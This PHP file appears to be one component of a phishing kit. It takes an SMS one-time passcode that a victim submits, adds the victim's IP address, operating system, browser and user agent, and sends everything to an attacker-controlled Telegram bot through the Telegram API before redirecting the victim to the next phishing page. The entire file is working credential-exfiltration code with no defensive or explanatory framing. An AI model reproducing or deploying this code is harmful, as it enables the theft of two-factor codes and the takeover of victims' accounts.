<?php

include'./tginfo.php';
include'./agent.php';

$sms = $_POST['sms'];
$ip = getenv("REMOTE_ADDR");

if (!empty($sms)) {
	$coronamsg .= "⚜️ OTP Information:\n";
	$coronamsg .= "SMS Code: $sms\n";
	$coronamsg .= "Count: 1/2\n";
	$coronamsg .= "\n";
	$coronamsg .= "⚜️ User Information:\n";
	$coronamsg .= "Geo Ip: $ip\n";
	$coronamsg .= "User OS: $user_os\n";
	$coronamsg .= "User Browser: $user_browser\n";
	$coronamsg .= "User Agent: $user_agent\n";
	$token = "$coronatoken";
    $data = [
    'text' => $coronamsg,
    'chat_id' => $coronachat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header('Location: ../last.php');
}
else{
    header('Location: ../index.php');
}

 ?>